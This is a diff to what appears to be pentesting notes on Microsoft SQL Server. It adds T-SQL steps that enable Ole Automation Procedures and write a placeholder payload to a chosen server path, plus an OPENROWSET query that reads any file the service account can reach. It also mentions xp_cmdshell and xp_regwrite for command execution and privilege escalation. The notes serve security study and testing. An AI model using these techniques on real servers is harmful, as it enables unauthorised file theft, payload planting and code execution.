@@ -37,7 +37,7 @@ Unless configured, the MSSQL service will typically run as `NT SERVICE\MSSQLSERV
 - Self-signed certificates might allow you to spoof them and make a connection
 - Weak or default `sa` credentials. Sometimes it may be forgotten to delete this account.
 - System command execution
-
+- Reading/Writing files on disk
 ### RCE
 The extended stored procedures (`xp_cmdshell`) allows us to execute system commands via SQL. It is *disabled by default* but can be enabled using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option). The windows process spawned by `xp_cmdshell` has the same privileges as the SQL Server service account. `xp_cmdshell` operates synchronously.
 ```sql
@@ -71,6 +71,38 @@ GO
 ```
 
 > There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.
+
+### Writing Files
+We can write files with [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, but this could lead to us being able to execute our file through another service.
+```sql
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+```
+```sql
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACReate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<path>', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<payload>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+```
+
+### Reading Files
+By default, we can read any file on the OS that the account has access to.
+```sql
+SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents
+GO
+```
+
 ## Enumeration Checklist
 
 | Goal                               | Command(s)                                                                                                                                                                                                                                                                                          | Refs                                                                                                                  |
